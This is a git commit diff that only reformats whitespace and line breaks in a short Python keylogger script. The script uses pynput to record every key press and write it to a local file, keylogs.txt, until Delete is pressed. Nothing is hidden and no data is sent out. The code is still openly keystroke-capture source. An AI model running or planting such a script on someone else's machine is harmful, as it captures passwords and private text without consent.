f143404276a3f21a76e090df6c533d9c245a6960
KruzeZab <kruzezab4@gmail.com>
2021-10-07 13:18:52 +0700

    Add readme file and update script basic info

--- Keyboard Logger/keyboard_logger.py
+++ Keyboard Logger/keyboard_logger.py
@@ -10,7 +10,8 @@ from pynput.keyboard import Key, Listener
 import logging
 
 
-logging.basicConfig(filename=("keylogs.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+logging.basicConfig(filename=("keylogs.txt"),
+                    level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
 
 def on_press(key):
@@ -20,7 +21,8 @@ def on_press(key):
     pressed_key = str(key)
     print(pressed_key)
     logging.info(pressed_key)
-    
+
+
 def on_release(key):
     '''
     stop monitoring if 
@@ -28,7 +30,8 @@ def on_release(key):
     '''
     if key == Key.delete:
         return False
-    
+
+
 with Listener(on_press=on_press, on_release=on_release) as listener:
     # Start Listening
     listener.join()
